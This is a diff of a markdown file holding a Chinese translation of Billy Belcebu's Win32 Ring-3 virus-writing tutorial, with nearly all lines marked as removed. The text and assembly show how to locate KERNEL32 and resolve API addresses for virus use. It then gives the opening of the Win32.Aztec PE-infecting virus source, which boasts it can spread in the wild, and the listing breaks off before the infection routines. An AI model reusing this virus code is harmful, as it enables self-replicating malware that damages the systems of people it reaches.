@@ -1,1881 +1,2288 @@
 
-
-# Billy Belceb 病毒编写教程 for Win32 ----Ring-3，用户级编码 
+# Billy Belceb 病毒编写教程 for Win32 ----Ring-3，用户级编码
 
 > 原文：[`www.pediy.com/kssd/pediy06/pediy65785.htm`](https://www.pediy.com/kssd/pediy06/pediy65785.htm)
 
-【Ring-3，在用户级下编程】  
-\~~~~~~~~~~~~~~~~~~~~~~~~~~  
-   嗯，用户级给了我们所有人很多令人压抑和不方便的限制，这是正确的，这妨碍了我们所崇拜的自由，这种我们在编写 DOS 病毒时所感受到的自由。但是，伙计，这就是生活，这就是我们的悲哀，这就是 Micro$oft。Btw，这是唯一的(当今)能够完全 Win32 兼容的病毒的方法，而且这个环境是未来，正如你必须知道的。首先，让我们看看怎么用一种非常简单的方法来获得 KERNEL32 的基址(为了 Win32 兼容性)：  
-  
-%获得 KERNEL32 基址的一个简单方法%  
-\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
-正如你所知道的，当我们在执行一个应用程序的时候，代码是从 KERNEL32 "call"一部分代码的(也就像 KERNEL 调用我们的代码一样)。而且，如果你还记得的话，当一个 call 调用之后，返回的地址是在堆栈里(即，在由 ESP 所指定的内存地址里的)的。让我们看看关于这个的一个实际例子：  
-  
-;---------------从这里开始剪切---------------------------------------------  
-  
-        .586p                           ; Bah... simply for phun.  
-        .model  flat                    ; Hehehe i love 32 bit stuph ;)  
-  
-        .data                           ; Some data (needed by TASM32/TLINK32)  
-          
-        db      ?  
-  
-        .code  
-  
- start:  
-        mov     eax,\[esp\]               ; Now EAX would be BFF8XXXXh (if w9X)  
-                                        ; ie, somewhere inside the API  
-                                        ; CreateProcess :)  
-        ret                             ; Return to it ;)  
- end    start  
-  
-;------------到这里为止剪切--------------------------------------------------  
-  
-     相当简单。我们在 EAX 中得到一个值大约为 BFF8XXXX(XXXX 是一个不重要的值，这里这么写是因为不需要精确地知道它，再也不要拿那些无聊的东西来烦我了:))。因为 Win32 平台通常会对齐到一个页，我们可以搜索任何一个页的开头，而且因为 KERNEL32 头就在一个页的开头，我们能够很轻松地检查它。而且当我们找到我现在正在讨论的 PE 头的时候，我们就知道了 KERNEL32 的基址。嗯，作为限制，我们可以以 50h 页为限。呵呵，不要担心，下面是一些代码:)  
-  
-;--------从这里开始剪切------------------------------------------------  
-  
-  
-        .586p  
-        .model  flat  
-  
- extrn  ExitProcess:PROC  
-  
-        .data  
-  
- limit  equ     5  
-  
-        db      0  
-  
- ;--------------------------------------  
- ; 没有用而且没有意义的数据 :)                                       ;  
- ;--------------------------------------  
-  
-        .code  
-  
- test:         
-        call    delta  
- delta:  
-        pop     ebp  
-        sub     ebp,offset delta  
-  
-        mov     esi,\[esp\]  
-        and     esi,0FFFF0000h  
-        call    GetK32  
-  
-        push    00000000h  
-        call    ExitProcess  
-  
- ;-------------------------------------  
- ; 呃，我认为你至少是一个普通 ASM 程序员, 所以我假定你知道指令的第一块是为了获得  
- ; 地址偏移变化量(特别在这个例子里面不需要，然而，我喜欢使得它就像我们的病毒代码)。  
- ; 第二块是我们所感兴趣的东西。我们把我们的程序开始调用的地址放在 ESI 中，即由 ESP  
- ; 所显示的地址(当然是如果我们在程序装载完后没有碰堆栈的情况下)。第二个指令，那个  
- ; AND，是为了获得我们的代码正在调用的页的开头。我们调用我们的例程，在这之后，我  
- ; 们结束处理:)  
- ;-------------------------------------  
-  
- GetK32:  
-  
- \_\_1:  
-        cmp     byte ptr \[ebp+K32\_Limit\],00h  
-        jz      WeFailed  
-  
-        cmp     word ptr \[esi\],"ZM"  
-        jz      CheckPE  
-  
- \_\_2:  
-        sub     esi,10000h  
-        dec     byte ptr \[ebp+K32\_Limit\]  
-        jmp     \_\_1  
-  
- ;-------------------------------------  
- ; 首先我们检查我们是否已经达到了我们的极限(50 页)。在这之后，我们检查是否在页的开  
- ; 头(它应该是)是否为 MZ 标志，而且如果找到了，我们继续检查 PE 头。如果没有，我们减  
- ; 去 10 页(10000h 字节)，我们增加限制变量，再次搜索  
- ;-------------------------------------  
-  
- CheckPE:  
-        mov     edi,\[esi+3Ch\]  
-        add     edi,esi  
-        cmp     dword ptr \[edi\],"EP"  
-        jz      WeGotK32  
-        jmp     \_\_2  
- WeFailed:  
-        mov     esi,0BFF70000h  
- WeGotK32:  
-        xchg    eax,esi  
-        ret  
-  
- K32\_Limit      dw      limit  
-  
- ;--------------------------------------  
- ; 我们在 MZ 头开始后的偏移地址 3CH 处得到值(存着从哪儿开始 PE 头的 RVA)，我们把这个  
- ; 值和页的地址规范化，而且如果从这个偏移地址处的内存地址标志是 PE 标志，我们就假  
- ; 设已经找到了...而且我们确实是找到了!  
- ;--------------------------------------  
-  
-end     test  
-  
-;--------到这里为止剪切-----------------------------------------------------  
-  
-     一个建议：我测试了它，而且在 Win98 下和 WinNT4 SP3 下面没有给我们任何类型的问题，然而，我不知道在其它任何地方会发生什么，我建议你使用 SEH 来避免可能的页错误(和它们相关的蓝屏)。SEH 将会在后面介绍。嗨，Lord Julus 在他的教程里面所使用的方法(在感染文件里面搜索 GetModuleHandleA 函数)并不能很好地满足我的需要，无论如何，我将给出那个我自己版本的代码，在那里我将解释怎么来玩输入函数。例如，它在 per-process 驻留病毒里面要用到，在这个例程里面有一小点改变:)  
-  
-%获取那些令人疯狂的 API 函数!!!%  
-\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
-    正如我在介绍那一章所介绍的，Ring-3 是用户级的，所以我们只能访问它的有限的权限。例如，我们不能使用端口，读或写某些的内存区域，等等。当开发 Win95(那些再也没有人说的"Win32 平台是不可感染"的系统)的时候，微软如果压制住过去所编写的病毒，微软就确信能够击败我们。在他们的美梦中，他们认为我们不能使用他们的 API 函数，而且，他们更没想到我们能跳转到 Ring-0，但是，这是另外一段历史了。  
-    正如你以前所说的，我们以 API 函数名作为外部函数，所以 import32.lib 给了我们函数的地址，而且它已经汇编了，但是我们在写病毒的时候有一个问题。如果我们 hardcode(也就是说我们调用一个 API 函数的时候给的是一个固定的偏移地址)，最可能发生的事情是在下一个版本的 Win32 版本中，那个地址再也不起作用了。你可以看看 Bizatch 中的一个例子。我们该怎么做呢？好了，我们有一个函数叫做 GetProcAddress,它返回给我们的是我们所需要的 API 的地址。聪明的你可能已经注意到了 GetProcAddress 也是一个 API，所以如果我们没有得到那个 API 还谈什么利用它来搜索其它 API 呢。正如在生活中我们所遇到的事情一样，我们有许多可能性的东西去做，而且我将提及我认为最好的两种方法：  
-  
-1.在输入表中搜索 GetProcAddress API 函数。  
-2.当我们感染一个文件的时候，在它的输入函数里寻找 GetProcAddress。  
-  
-    因为最早的方法是第一个，猜猜现在我将会解释哪一个呢？:)OK,让我们以理论学习开始，在这之后，一些代码。  
-    如果你看看 PE 头的格式，我们在偏移地址 78h(是 PE 头，不是文件!)得到输入表。好了，我们需要利用内核的输出地址。在 Window 95/98 下，内核通常在偏移地址 0BFF70000h 处，而 Window NT 的内核看起来是在 077F00000h 处。在 Win2K 中我们在偏移地址 077E00000h 处得到它。所以，首先，我们把它的地址保存到寄存器中，我们将用来作为指针。我强烈建议使用 ESI，主要是因为我们可以通过使用 LODSD 来优化一些东西。好了，我们检查在这个地址处是不是"MZ"(恩反过来为"ZM"，该死的 intel 处理器架构)，因为内核是一个库(.DLL)，而库有一个 PE 头，正如我们以前看 PE 头的时候，是 DOS-兼容的一部分的时候所看到的。在那个比较之后，让我们检查它是不是 PE，所以我们到头的偏移 image\_base+\[3Ch\] (=内核的偏移地址＋内核的 PE 头的 3Ch 偏移)，搜索比较"PE\\0\\0",PE 文件的签名。  
-    如果所有都正确，那么让我们继续。我们需要输出表的 RVA，正如你所能看到的，它在 PE 头的偏移地址 78h 处。所以我们得到了它。但是，正如你所知道的，RVA(Relative Virtual Address)，正如它的名字所表明的，是和一个 OFFSET 的相对值，在这种 image base 为 kernel 的情况下，正如我以前所说的，那就是它的地址。就这么简单：仅仅把 kernel 的偏移加上在输出表(Export Table)中的 RVA 即可。好了，我们现在已经在输出表中了:)  
-    让我们看看它的格式：    
- ---------------------------------- <----+00000000h   
-|          Export Flags            |      Size : 1 DWORD  
-|----------------------------------|<----+00000004h   
-|        Time/Date stamp           |      Size : 1 WORD  
-|----------------------------------|<----+00000006h   
-|          Major version           |       Size : 1 WORD  
-|----------------------------------|<----+00000008h    
-|          Minor version           |      Size : 1 DWORD  
-|----------------------------------|<----+0000000Ch    
-|            Name RVA              |      Size : 1 DWORD  
-|----------------------------------|<----+00000010h    
-|   Number Of Exported Functions   |      Size : 1 DWORD  
-|----------------------------------|<----+00000014h   
-|     Number Of Exported Names     |      Size : 1 DWORD  
-|----------------------------------|<----+00000018h   
-|     Export Address Table RVA     |      Size : 1 DWORD  
-|----------------------------------|<----+0000001Ch   
-|   Export Name Pointers Table RVA |      Size : 1 DWORD  
-|----------------------------------|<----+00000020h   
-|       Export Ordinals RVA        |      Size : 1 DWORD  
-|\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|               
-                                       Total Size : 24h BYTES  
-  
-    对我们来说是最后 6 个域。在地址表 RVA 的值中，正如你能想象的是，Name Pointers RVA 和 Ordinals RVA 都是和 KERNEL32 的基址相关的。所以，获得 API 地址的第一步是知道这个 API 的位置，而知道它的最简单的方法是到 Name Pointers 所指示的偏移地址处去寻找，把它和我们想要找的 API 做比较，如果它们完全相同，我们就要计算 API 的偏移地址了。好了，我们已经到了这一步了，而且我们在计数器中有一个值，因为我们没检查一次 API 的名字就加一次。这个计数器，正如你能想象的，将会保存我们已经找到的 API 名字的个数，而且它们不相等。这个计数器可以是一个字或一个双字，但是最好不要是一个字节，因为我们需要超过 255 个 API 函数:)  
-    说明：我假设你把地址的 VA(RVA+kernel image base),Name 和 (序数表)Ordinal tables 已经保存到相关的变量中了。  
-    OK，假设我们已经获得了我们想要得到的 API 的名字，所以，我们得到了它在名字指针表中的计数。接下来可能对你来说是最复杂的，开始 Win32 编码。嗯，让我们继续下去。我们得到了计数，而且我们现在要在 Ordinal Table(一个 dword 数组)中搜索我们想要得到的 API 的序数。当我们得到了 API 在数组(在计数器)中的数字，我们仅仅把它乘以 2(记住，序数数组是由字组成的，所以，我们必须对字进行计算...)，而且当然了，把它加上序数表的开始偏移地址。为了继续我已经解释的东西，我们需要由下面公式指向的字：  
-  
-API's Ordinal location: ( counter \* 2 ) + Ordinal Table VA  
-  
-    很简单，是不是啊？下一步(而且是最后一步)是从地址表中获得 API 的确定地址。我们已经得到了 API 的序号，对吗？利用它，我们的生活变得非常容易。我们只有把序号乘以 4(因为地址数组是双字形式的而不是字，而一个双字的大小是 4)，而且把它加上先前得到的地址表开始的偏移地址。呵呵，现在，我们得到了 API 地址的 RVA 啦。所以我们要把它规范化，加上 Kernel 的偏移地址，那样就好了。我们得到了它!!!让我们看看这个的数学公式：  
-  
- API's Address: ( API's Ordinal \* 4 ) + Address Table VA + KERNEL32 imagebase  
-  
- --------------------------------------------------------------------- So, as we retrieve  the position  
- | EntryPoint | Ordinal | Name             | that occupies the  string in the  
- |--------------------|---------------|-------------------------------| Names  table, we  can  know  its   
- |  00005090  |   0001  | AddAtomA         | ordinal (each name has  an ordi-  
- |--------------------|---------------|-------------------------------| nal that is in the same position  
- |  00005100  |   0002  | AddAtomW         | than the API name), and  knowing  
- |--------------------|---------------|-------------------------------| the  ordinal, we  can  know  its  
- |  00025540  |   0003  | AddConsoleAliasA  | Address, that is, its entrypoint  
- |--------------------|---------------|-------------------------------| RVA. We normalize it, and voila,  
- |  00025500  |   0004  | AddConsoleAliasW | you  have  what  you  need,  the   
- \\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\ required API address.  
-  
-\[...\]这些表还有更多的入口，但是有那些就足够了...  
-     我希望你已经理解了我解释的东西。我试图尽可能的使它表述简单，如果你不能理解它，不要往下看了，一步一步地重读它。要有耐心。我肯定你会懂地。嗯，现在你可能需要一些代码了。下面给出我例程，作为一个示例，在我的 Iced Earth 病毒中用到了。  
-  
-;----从这儿开始剪切-----------------------------------------------------------  
-;  
-; GetAPI & GetAPIs procedures  
-; ===========================  
-;  
-; 这是我的寻找所有需要的 API 的函数... 它们被分成了两部分。  
-; GetAPI 函数仅仅获得了我们需要的一个函数, 而 GetAPIs 函数  
-; 则搜索病毒所需要的所有 API 函数。  
-;  
-  
- GetAPI         proc  
-  
- ;--------------------------------------------------------------------------  
- ; 让我们来看看，这个函数需要和返回的参数如下：  
- ;   
- ;                                                                         
- ; 输入：   ESI : 指向 API 名字的指针 (区分大小写)                   
- ; 输出：   EAX : API 地址                                                
- ;--------------------------------------------------------------------------  
-  
-        mov     edx,esi                         ; Save ptr to name  
- @\_1:   cmp     byte ptr \[esi\],0                ; Null-terminated char?  
-        jz      @\_2                             ; Yeah, we got it.  
-        inc     esi                             ; Nopes, continue searching  
-        jmp     @\_1                             ; bloooopz...  
- @\_2:   inc     esi                             ; heh, don't forget this ;)  
-        sub     esi,edx                         ; ESI = API Name size  
-        mov     ecx,esi                         ; ECX = ESI :)  
-  
- ;--------------------------------------------------------------------------  
- ; 好了，我亲爱的朋友们，这很容易理解。我们在 ESI 中是指向 API 名字开始  
- ; 的指针，让我们想象一下，我们想要寻找"FindFirstFileA":  
- ;                                                                   
- ; FFFA         db   "FindFirstFileA",0                          
- ;                   ↑ 指针指向这儿                          
- ;                                                              
- ; 而且我们需要保存这个指针，并知道了 API 名的大小，所以  
- ; 我们把指向 API 名字的初始指针保存到一个我们不用的寄存器中如 EDX  
- ; 然后增加在 ESI 中的指针的值，直到\[ESI\]=0  
- ;                                                                    
- ; FFFA         db   "FindFirstFileA",0                            
- ;                                    ↑ 现在指针指向这儿了     
- ;                                                                   
- ; 也就是说，以 NULL 结尾:)然后，通过把新指针减去旧指针，我们得  
- ; 到了 API 名字的大小，搜索引擎需要它。然后我把它保存到 ECX 中，  
- ; 也是一个我们不会使用的寄存器。  
- ;---------------------------------------------------------------------------  
-  
-        xor     eax,eax                         ; EAX = 0  
-        mov     word ptr \[ebp+Counter\],ax       ; Counter set to 0  
-  
-        mov     esi,\[ebp+kernel\]                ; Get kernel's PE head. offset  
-        add     esi,3Ch  
-        lodsw                                   ; in AX  
-        add     eax,\[ebp+kernel\]                ; Normalize it  
-  
-        mov     esi,\[eax+78h\]                   ; Get Export Table RVA  
-        add     esi,\[ebp+kernel\]                ; Ptr to Address Table RVA  
-        add     esi,1Ch  
-  
- ;---------------------------------------------------------------------------  
- ; 首先，我们清除 EAX，然后为了避免无法预料的错误，使得计数变量为 0。  
- ; 如果你还记得 PE 文件头偏移地址 3CH(从映象基址 MZ 标志开始计数)的作用，  
- ; 你会理解这个的。我们正在请求得到 KERNEL32 PE 头偏移的开始。因为  
- ; 它是一个 RVA，我们把它规范化，那就是我们得到了它的 PE 头偏移地址。  
- ; 现在我们所要做的是获得输出表(Export Table)的地址(在 PE 头+78h 处)，  
- ; 然后，我们避开这个结构的不想要的数据，直接获得地址表(Address Table)  
- ; 的 RVA。  
- ;---------------------------------------------------------------------------  
-  
-        lodsd                                   ; EAX = Address Table RVA  
-        add     eax,\[ebp+kernel\]                ; Normalize  
-        mov     dword ptr \[ebp+AddressTableVA\],eax ; Store it in VA form  
-  
-        lodsd                                   ; EAX = Name Ptrz Table RVA  
-        add     eax,\[ebp+kernel\]                ; Normalize  
-        push    eax                             ; mov \[ebp+NameTableVA\],eax  
-  
-        lodsd                                   ; EAX = Ordinal Table RVA  
-        add     eax,\[ebp+kernel\]                ; Normalize  
-        mov     dword ptr \[ebp+OrdinalTableVA\],eax ; Store in VA form  
-  
-        pop     esi                             ; ESI = Name Ptrz Table VA  
-  
- ;---------------------------------------------------------------------------  
- ; 如果你还记得，在 ESI 中是指向地址表 RVA(Address Table RVA)的指针，所以，  
- ; 我们为了得到那个地址，用了一个 LODSD，它把由 ESI 所指定的双字(DWORD)保  
- ; 存到 EAX 中。因为它是一个 RVA，我们需要对它规范化。  
- ;                                                                   
- ; 让我们看看 Matt Pietrek 关于这个第一个域的描述：  
- ;                                                                     
- ; “这个域是一个 RVA 而且指向一个函数地址数组。这个函数地址是这个模块中  
- ; 每一个输出地址的入口点(RVA)。”  
- ;                                         
- ;                                                         
- ; 毫无疑问了，我们把它保存到它的变量中了。然后，接下来我们找到的  
- ; 是名字指针表(Name Pointers Table)，Matt Pietrek 的描述如下：  
- ;                                  
- ; “这个域是一个 RVA，而且指向一个字符串指针数组。这些字符串是模块  
- ; 的输出函数的名字。”  
- ;                                                     
- ; 但是我没有把它保存到一个变量中，我把它压栈，仅仅是因为我很快就要用到  
- ; 它。最终，我们找到了，下面是 Matt Pietrek 关于它的描述：  
- ;                                             
- ; “这个域是一个 RVA，而且指向一个字(WORD)数组。这些字是这个模块  
- ; 的所有输出函数的序号”。  
- ;                                       
- ; 好了，那就是我们所做的事情。  
- ;---------------------------------------------------------------------------  
-  
- @\_3:   push    esi                             ; Save ESI for l8r restore  
-        lodsd                                   ; Get value ptr ESI in EAX  
-        add     eax,\[ebp+kernel\]                ; Normalize  
-        mov     esi,eax                         ; ESI = VA of API name  
-        mov     edi,edx                         ; EDI = ptr to wanted API  
-        push    ecx                             ; ECX = API size  
-        cld                                     ; Clear direction flag  
-        rep     cmpsb                           ; Compare both API names  
-        pop     ecx                             ; Restore ECX  
-        jz      @\_4                             ; Jump if APIs are 100% equal  
-        pop     esi                             ; Restore ESI  
-        add     esi,4                           ; And get next value of array  
-        inc     word ptr \[ebp+Counter\]          ; Increase counter  
-        jmp     @\_3                             ; Loop again  
-  
- ;---------------------------------------------------------------------------  
- ; 嗨，是不是我放了太多的代码而没有注释？因为我刚做好，但是懂得了这一块代码  
- ; 不能因为解释它而分离开来。我们首先所做的是把 ESI(在 CMPSB 指令执行中将改变)  
- ; 压栈，以备后用。然后，我们获得由 ESI(Name Pointerz Table)指向的双字保存到  
- ; 累加器(EAX)中，所有这些通过 LODSD 指令实现。我们通过加上 kernel 的基址来规范  
- ; 化它。好了，现在我们在 EAX 中是指向某一个 API 名字的指针，但是我们不知道(仍然)  
- ; 是什么 API。例如，EAX 可以指向诸如"CreateProcessA"，而这个 API 对我们的病毒来  
- ; 说不感兴趣...为了把那个字符串和我们想要的字符串(现在由 EDX 指向)，我们有 CMPSB。  
- ; 所以，我们准备它的参数:在 ESI 中，我们使得指针指向现在在 Name Pointerz Table 中  
- ; 的 API 的开始，在 EDI 中，我们使之指向需要的 API)。在 ECX 中我们保存它的大小，  
- ; 然后我们按字节比较。如果所有的字符相等，就设置 0 标志，然后跳转到获取那个 API  
- ; 地址的例程，但是如果它失败了，我们恢复 ESI，并把它加上 DWORD 的大小，为了获取  
- ; 在 Name Pointerz Table 数组中的下一个值。我们增加计数器的值(非常重要)，然后  
- ; 继续搜索。  
- ;---------------------------------------------------------------------------  
-  
- @\_4:   pop     esi                             ; Avoid shit in stack  
-        movzx   eax,word ptr \[ebp+Counter\]      ; Get in AX the counter  
-        shl     eax,1                           ; EAX = AX \* 2  
-        add     eax,dword ptr \[ebp+OrdinalTableVA\] ; Normalize   
-        xor     esi,esi                         ; Clear ESI  
-        xchg    eax,esi                         ; EAX = 0, ESI = ptr to Ord  
-        lodsw                                   ; Get Ordinal in AX  
-        shl     eax,2                           ; EAX = AX \* 4  
-        add     eax,dword ptr \[ebp+AddressTableVA\] ; Normalize  
-        mov     esi,eax                         ; ESI = ptr to Address RVA  
-        lodsd                                   ; EAX = Address RVA  
-        add     eax,\[ebp+kernel\]                ; Normalize and all is done.  
-        ret  
-  
- ;---------------------------------------------------------------------------  
- ; Pfff, 又一个巨大的代码块，而且看起来很难理解，对吗?呵呵，不要害怕，我将要  
- ; 注释它:)  
- ; 呃，pop 指令是为了清除堆栈，我们把计数值(因为它是一个 WORD)放置到 EAX 的低位  
- ; 中，并把这个寄存器的高位清 0。我们把它乘以 2，因为我们只得到了它的数字，  
- ; 而且我们要搜索的数组是一个 WORD 数组。现在把它加上指向我们要搜索的数组开始的  
- ; 指针，而在 EAX 中是我们想要的 API 的指针的序号。所以我们把 EAX 保存到 ESI 中为了使  
- ; 用那个指针来获取它指向的值，也就是说，序号保存到 EAX 中，用简单的 LODSW。  
- ; 嗨，我们得到了序号，但是我们想要的是 API 代码的入口(EntryPoint)，所以，我们  
- ; 把序数(保存了想要的 API 在地址表中的入口点位置)乘上 4，也就是说 DWORD 的大小，  
- ; 然后我们得到了一个 RVA 值，和 Address Table RVA 相关，所以我们规范化，那么现在  
- ; 我们在 EAX 中得到的是指向地址表中的 API 的入口点的指针。我们把 EAX 赋给 ESI，在 EAX  
- ; 中得到了指向的值。这样我们在 EAX 中得到了需要的 API 的入口 RVA 的值。嗨,现在我们  
- ; 必须要做的是把那个地址和 KERNEL32 的基址规范化，瞧，做好了，我们在 EAX 中  
- ; 得到了 API 的真正地址!!!;)  
- ;---------------------------------------------------------------------------  
-  
- GetAPI         endp  
-  
- ;---------------------------------------------------------------------------  
- ;---------------------------------------------------------------------------  
-  
- GetAPIs        proc  
-   
- ;---------------------------------------------------------------------------  
- ; Ok, 这是通过使用以前的函数来获得所有 API 的代码，它的参数为:  
- ;                                                                       
- ; 输入:  ESI : 指向想要得到的第一个 API 名字 ASCII 码的首地址            
- ;        EDI : 指向将要保存的想要得到第一个 API 的变量  
- ; 输出:  无。                                                       
- ;                                          
- ; 好了，我假设你想要获得的所有值的结构如下：  
- ;                                                                 
- ; ESI 指向 →  db         "FindFirstFileA",0               
- ;              db         "FindNextFileA",0              
- ;              db         "CloseHandle",0              
- ;              \[...\]                                     
- ;              db         0BBh ; 标志着这个数组的结束    
- ;                                                           
- ; EDI 指向 → dd         00000000h ;  FFFA 的将来的地址       
- ;             dd         00000000h ;  FNFA 的将来的地址   
- ;             dd         00000000h ;  CH   的将来的地址   
- ;             \[...\]                             
- ; 我希望你足够聪明，能理解它。               
- ;---------------------------------------------------------------------------  
-  
- @@1:   push    esi  
-        push    edi  
-        call    GetAPI  
-        pop     edi  
-        pop     esi  
-        stosd  
-  
- ;---------------------------------------------------------------------------  
- ; 我们把在这个函数中处理的值压栈为了避免它们改变，并调用 GetAPI 函数。  
- ; 我们假设现在 ESI 是一个指向想要的 API 名字的指针，EDI 是指向要处理 API 名字的变量  
- ; 的指针。因为函数在 EAX 中返回给我们 API 的偏移地址，我们通过使用 STOSD 把它保存到  
- ; 由 EDI 指向的相关变量中。  
- ;---------------------------------------------------------------------------  
-  
- @@2:   cmp     byte ptr \[esi\],0  
-        jz      @@3  
-        inc     esi  
-        jmp     @@2  
- @@3:   cmp     byte ptr \[esi+1\],0BBh  
-        jz      @@4  
-        inc     esi  
-        jmp     @@1  
- @@4:   ret  
- GetAPIs        endp  
-  
- ;---------------------------------------------------------------------------  
- ; 可以更优化，我知道，但是，为了更好为我的解释服务。我们首先所做的是到达我们  
- ; 以前请求的地址的字符串的尾部，现在它指向下一个 API。但是我们想要知道它是否  
- ; 是最后一个 API，所以我们检查我们的标志，字节 0BBh(猜猜为什么是 0BBh?)。如果它  
- ; 是，我们就已经得到了所有需要的 API，而如果不是，我们继续我们的搜索。  
- ;---------------------------------------------------------------------------  
- ;------到这儿为止剪切-------------------------------------------------------  
-  
-    呵呵，我尽可能的使得这些过程简单，而且我注释了很多，你将会不通过复制就可以理解了。而且如果你  
-你复制也不是我的问题...呵呵，我没有不允许你复制它:)但是，现在的问题是我们该搜索什么 API 呢?这主要依赖于在进行 PE 操作之前方式。我将给你演示一个直接行为(即运行期)版本的一个病毒，它使用了文件映射计数(更容易操作和更快地感染)，我将会列出你能使用地 API 函数。  
-  
-%一个病毒示例%  
-\~~~~~~~~~~~~~~  
-    不要认为我疯了，我将在这里放一个病毒的代码仅仅是为了避免烦人的解释所有 API 的东西，而且还可以看看它们的作用:)好了，下面你得到的是我的最近的创造。我花了一个下午来完成它：我把它基于 Win95.Iced Earth，但是没有 bug 和特殊功能。享受这个 Win32.Aztec!(Yeah, Win32!!!)。  
-  
-;----从这儿开始剪切-----------------------------------------------------------  
-; \[Win32.Aztec v1.01\] - Iced Earth 的 Bug 修复版本  
-; Copyright (c) 1999 by Billy Belcebu/iKX  
-;  
-; 病毒名    : Aztec v1.01  
-; 病毒作者  : Billy Belcebu/iKX  
-; 国籍      : Spain(西班牙)  
-; 平台      : Win32  
-; 目标      : PE 文件  
-; 编译      : TASM 5.0 和 TLINK 5.0 用  
-;                       tasm32 /ml /m3 aztec,,;  
-;                       tlink32 /Tpe /aa /c /v aztec,aztec,,import32.lib,  
-;                       pewrsec aztec.exe  
-; 说明      : 现在所有东西都是特别的了。只是 Iced Earth 病毒的 bug 修复，并移除了一些特殊功能  
-;             这是一个学习 Win32 病毒的真正病毒。  
-; 为什么'Aztec'?  : 为什么叫这个名字呢?许多原因:  
-;                 ?如果有一个 Inca 病毒和一个 Maya 病毒... ;)  
-;                 ?我在 Mexico 生活过 6 个月  
-;                 ?I hate the fascist way that Hernan Cortes used for steal  
-;                   their territory to the Aztecs  
-;                 ?I like the kind of mithology they had ;)  
-;                 ?我的声卡是一个 Aztec 的 :)  
-;                 ?我爱 Salma Hayek! :)~  
-;                 ?KidChaos 是我的一个朋友 :)  
-; 问候     : 这次只向所有在 EZLN 和 MRTA 的人问候。  
-;                 祝所有人好运，和... 继续战斗!  
-;  
-; (c) 1999 Billy Belcebu/iKX  
-  
-        .386p                                   ; 需要 386+  =)  
-        .model  flat                            ; 32 位寄存器, 没有段.  
-        jumps                                   ; 为了避免跳出范围  
-  
-extrn   MessageBoxA:PROC                        ; 第一次产生的时候输入的 API 函数:)   
-extrn   ExitProcess:PROC                        ;   
-  
-; 病毒的一些有用的 equ  
-  
-virus\_size      equ     (offset virus\_end-offset virus\_start)  
-heap\_size       equ     (offset heap\_end-offset heap\_start)  
-total\_size      equ     virus\_size+heap\_size  
-shit\_size       equ     (offset delta-offset aztec)  
-  
-; 仅仅是为第一次产生的时候编码的, 不要担心 ;)  
-  
-kernel\_         equ     0BFF70000h  
-kernel\_wNT      equ     077F00000h  
-  
-        .data  
-  
-szTitle         db      "\[Win32.Aztec v1.01\]",0  
-  
-szMessage       db      "Aztec is a bugfixed version of my Iced Earth",10  
-                db      "virus, with some optimizations and with some",10  
-                db      "'special' features removed. Anyway, it will",10  
-                db      "be able to spread in the wild succefully :)",10,10  
-                db      "(c) 1999 by Billy Belcebu/iKX",0  
-  
- ;---------------------------------------------------------------------------  
- ; 所有这些都是狗屎：有一些宏可以使得这些代码更好看，而且有一些是为  
- ; 第一次产生时用的，等等。  
- ;---------------------------------------------------------------------------  
-  
-        .code  
-  
-virus\_start     label   byte  
-  
-aztec:  
-        pushad                                  ; Push 所有寄存器  
-        pushfd                                  ; Push FLAG 寄存器  
-  
-        call    delta                           ; 最难理解的代码 ;)  
-delta:  pop     ebp  
-        mov     eax,ebp  
-        sub     ebp,offset delta  
-  
-        sub     eax,shit\_size                   ; Obtain the Image Base on   
-        sub     eax,00001000h                   ; the fly  
-NewEIP  equ     $-4  
-        mov     dword ptr \[ebp+ModBase\],eax  
-  
- ;---------------------------------------------------------------------------  
- ; Ok. 首先，我把所有的寄存器和所有的标志都压栈了(不是因为需要这么做，仅仅是  
- ; 因为我一直喜欢这么做)。然后，我所做的都是非常重要的。是的!它是 delta offset!  
- ; 我们必须得到它因为原因你必须知道：我们不知道我们是在内存的哪里执行代码，所  
- ; 以通过这个我们就能很容易地知道它...我不会告诉你更多关于 delta offset 的东西了，  
- ; 因为我肯定你已经从 DOS 编码就知道了;)接下来是获得当前进程的基址(Image Base),  
- ; 这需要返回控制权给主体(将会在以后做)。首先我们减去在 delta 标志和 aztec 标志  
- ; (7 bytes->PUSHAD (1)+PUSHFD (1)+CALL (5))的字节，然后我们减去当前的 EIP  
- ; (在感染的时候补丁)，也就是说我们得到了当前的基址(Image Base)。  
- ;---------------------------------------------------------------------------  
-  
-  
-        mov     esi,\[esp+24h\]                   ; 获得程序返回地址  
-        and     esi,0FFFF0000h                  ; 和 10 页对其  
-        mov     ecx,5                           ; 50 页 (10 组)  
-        call    GetK32                          ; 调用它  
-        mov     dword ptr \[ebp+kernel\],eax      ; EAX 必须是 K32 的基址  
-  
- ;---------------------------------------------------------------------------  
- ; 首先，我们从调用的进程(它在，可能为 CreateProcess API 函数)中得到的地址放到  
- ; ESI 中，它最初是由 ESP 所指向的地址，但是当我们使用堆栈压了 24 个字节(20 被 PUSHAD,  
- ; 其它的为 PUSHFD)，我们不得不修正它。然后我们使它按 10 页对齐，使 ESI 的低位为 0。  
- ; 在这之后，我们设置 GetK32 函数的其它参数，ECX，保存着要搜索的 10 页的最大组数，  
- ; 为 5(也就是说 5\*10=50 页)，然后我们调用函数。当它返回给我们正确的 KERNEL32 的  
- ; 基址之后，我们把它保存起来。  
- ;---------------------------------------------------------------------------  
-  
-        lea     edi,\[ebp+@@Offsetz\]  
-        lea     esi,\[ebp+@@Namez\]  
-        call    GetAPIs                         ; 找到所有的 API  
-  
-        call    PrepareInfection  
-        call    InfectItAll  
-  
- ;---------------------------------------------------------------------------  
- ; 首先，我们设置 GetAPIs 函数的参数，就是在 EDI 中是一个指针，这个指针指向将要  
- ; 保存 API 地址的 DWORD 数组，在 ESI 是所有要搜索的 API 函数的 ASCII 名字。  
- ;---------------------------------------------------------------------------  
-  
-        xchg    ebp,ecx                         ; 是不是第一次产生?  
-        jecxz   fakehost  
-  
-        popfd                                   ; 恢复所有的标志  
-        popad                                   ; 恢复所有的寄存器  
-  
-        mov     eax,12345678h  
-        org     $-4  
-OldEIP  dd      00001000h  
-  
-        add     eax,12345678h  
-        org     $-4  
-ModBase dd      00400000h  
-  
-        jmp     eax  
-  
